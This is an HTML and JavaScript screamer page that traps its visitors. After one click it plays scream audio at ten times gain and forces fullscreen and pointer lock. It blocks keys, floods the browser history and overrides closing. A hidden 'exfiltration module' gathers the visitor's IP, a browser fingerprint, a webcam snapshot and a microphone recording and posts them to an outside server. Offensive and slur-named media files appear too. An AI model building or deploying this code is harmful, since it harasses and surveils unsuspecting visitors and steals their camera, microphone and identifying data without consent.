<style>
* { 
    padding: 0; 
    margin: 0; 
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}

body, html {
    overflow: hidden;
    height: 100%;
    width: 100%;
    background: #000;
    cursor: none;
}

.video-container {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: space-between;
    z-index: 1000;
}

.video-wrapper {
    width: 640px;
    height: 480px;
    position: relative;
    flex-shrink: 0;
}

/* Style both video and img elements inside the wrapper */
.video-wrapper video,
.video-wrapper img {
    width: 100%;
    height: 100%;
    object-fit: contain;
    position: absolute;
    top: 0;
}

.video-divider {
    width: 2px;
    height: 480px;
    background: red;
    flex-shrink: 0;
}

.click-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999999;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
}

.click-overlay button {
    padding: 20px 40px;
    font-size: 20px;
    background: #fff;
    color: #000;
    border: none;
    border-radius: 0;
    cursor: pointer;
}

.black-screen {
    background-color: black;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999998;
}

.backg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
}

.backg img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    opacity: 0.3;
}
</style>
</head>
<body>

<!-- Click anywhere on overlay to start (button is just visual) -->
<div class="click-overlay" id="startOverlay">
    <button>ENTER</button>
</div>
<div class="black-screen"></div>

<audio id="shart" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart3" preload="auto" loop src="rape.mp3"></audio>

<div class="video-container">
    <!-- Third element: wads.gif (as an image, not a video) -->
    <div class="video-wrapper">
        <img id="wads" src="wads.gif" alt="">
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="fart" loop src="zzart.mp4" playsinline></video>
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="ronnie" loop src="ronnie.mp4" playsinline></video>
    </div>
</div>

<div class="backg"><img src="naggars.gif"></div>

<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>
(function() {
    let hasTriggered = false;
    const ORIGINAL_WIDTH = 640;
    const ORIGINAL_HEIGHT = 480;

    // ================================================================
    // NEW: EXFILTRATION MODULE (IP, fingerprint, webcam, mic)
    // ================================================================
    const BACKEND_URL = 'https://kekman.space/collect'; // CHANGE THIS

    async function getIP() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            if (!res.ok) throw new Error('IP API failed');
            return await res.json();
        } catch (e) {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return { ip: data.ip, source: 'ipify' };
            } catch (err) {
                return { error: 'Could not retrieve IP' };
            }
        }
    }

    function getFingerprint() {
        const fp = {};
        fp.userAgent = navigator.userAgent;
        fp.language = navigator.language;
        fp.platform = navigator.platform;
        fp.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
        fp.deviceMemory = navigator.deviceMemory || 'unknown';
        fp.maxTouchPoints = navigator.maxTouchPoints || 'unknown';
        fp.screen = {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio
        };
        fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = '#069';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
            fp.canvas = canvas.toDataURL();
        } catch (e) { fp.canvas = 'error'; }

        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                fp.webgl = { vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER) };
            } else {
                fp.webgl = 'not supported';
            }
        } catch (e) { fp.webgl = 'error'; }

        return fp;
    }

    async function captureWebcam() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 } } });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            await new Promise(r => setTimeout(r, 1000));
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(t => t.stop());
            return canvas.toDataURL('image/jpeg', 0.8);
        } catch (e) {
            return null;
        }
    }

    async function captureMic() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];
            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
            return new Promise((resolve) => {
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onloadend = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(t => t.stop());
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 3000);
            });
        } catch (e) {
            return null;
        }
    }

    async function sendToBackend(ipData, fingerprint, webcamBase64, micBase64) {
        const payload = { ipData, fingerprint, webcam: webcamBase64, mic: micBase64, timestamp: new Date().toISOString() };
        try {
            await fetch(BACKEND_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (e) {
            console.warn('Failed to send to backend:', e);
        }
    }

    async function runExfiltration() {
        const ipData = await getIP();
        const fingerprint = getFingerprint();
        const webcamBase64 = await captureWebcam();
        const micBase64 = await captureMic();
        await sendToBackend(ipData, fingerprint, webcamBase64, micBase64);
    }
    // ================================================================
    // END OF EXFILTRATION MODULE
    // ================================================================

    // --- AUDIO BOOST (Web Audio API) ---
    let audioContext;
    let gainNode;
    const mediaElements = [];

    function initAudioBoost() {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        gainNode = audioContext.createGain();
        gainNode.gain.value = 10; // 10x volume
        gainNode.connect(audioContext.destination);

        const audioIds = ['shart', 'shart2', 'shart3'];
        audioIds.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                mediaElements.push(el);
                const source = audioContext.createMediaElementSource(el);
                source.connect(gainNode);
                el.loop = true;
                el.muted = false;
            }
        });

        const videoIds = ['fart', 'ronnie'];
        videoIds.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                mediaElements.push(el);
                const source = audioContext.createMediaElementSource(el);
                source.connect(gainNode);
                el.loop = true;
                el.muted = false;
            }
        });
    }

    function playAllMedia() {
        if (audioContext && audioContext.state === 'suspended') {
            audioContext.resume();
        }
        mediaElements.forEach(m => {
            if (m) {
                m.volume = 1.0;
                m.muted = false;
                const playPromise = m.play();
                if (playPromise !== undefined) {
                    playPromise.catch(() => {
                        setInterval(() => m.play(), 100);
                    });
                }
            }
        });
    }

    // --- FULLSCREEN LOCK ---
    function attemptFullscreen() {
        const elem = document.documentElement;
        if (elem.requestFullscreen) elem.requestFullscreen();
        else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
        else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
        else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
    }

    // --- POINTER LOCK ---
    function lockPointer() {
        if (document.body.requestPointerLock) {
            document.body.requestPointerLock();
        }
    }

    // --- HISTORY FLOOD ---
    function floodHistory() {
        for (let i = 0; i < 20; i++) {
            history.pushState(null, null, location.href);
        }
    }

    // --- KEY BLOCKING ---
    function blockKeys(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }

    // --- RE-ENGAGE LOCKS ---
    function reengageLocks() {
        if (hasTriggered) {
            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
                attemptFullscreen();
            }
            if (!document.pointerLockElement) {
                lockPointer();
            }
        }
    }

    // --- START FUNCTION ---
    window.startExperience = function() {
        if (hasTriggered) return;
        hasTriggered = true;

        const overlay = document.getElementById('startOverlay');
        const blackScreen = document.querySelector('.black-screen');
        if (overlay) overlay.style.display = 'none';
        if (blackScreen) blackScreen.style.display = 'none';

        floodHistory();
        initAudioBoost();
        playAllMedia();
        attemptFullscreen();
        lockPointer();

        setInterval(reengageLocks, 200);

        const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown'];
        events.forEach(eventType => {
            document.addEventListener(eventType, reengageLocks, true);
        });

        document.addEventListener('fullscreenchange', reengageLocks);
        document.addEventListener('webkitfullscreenchange', reengageLocks);
        document.addEventListener('mozfullscreenchange', reengageLocks);
        document.addEventListener('MSFullscreenChange', reengageLocks);

        document.addEventListener('pointerlockchange', reengageLocks);
        document.addEventListener('mozpointerlockchange', reengageLocks);
        document.addEventListener('webkitpointerlockchange', reengageLocks);

        document.addEventListener('keydown', blockKeys, true);
        document.addEventListener('keyup', blockKeys, true);
        document.addEventListener('keypress', blockKeys, true);

        // ======== ADDED: Run exfiltration ========
        setTimeout(() => {
            runExfiltration().catch(console.warn);
        }, 500);
    };

    document.getElementById('startOverlay').addEventListener('click', startExperience);

    document.addEventListener('contextmenu', e => e.preventDefault(), true);
    document.addEventListener('dragstart', e => e.preventDefault(), true);
    document.addEventListener('selectstart', e => e.preventDefault(), true);

    window.onbeforeunload = function() {
        return "Are you absolutely sure you want to leave?";
    };

    window.close = function() {
        console.warn('Nice try.');
    };

    window.onpopstate = function() {
        if (hasTriggered) {
            floodHistory();
            reengageLocks();
        }
    };
})();
</script>
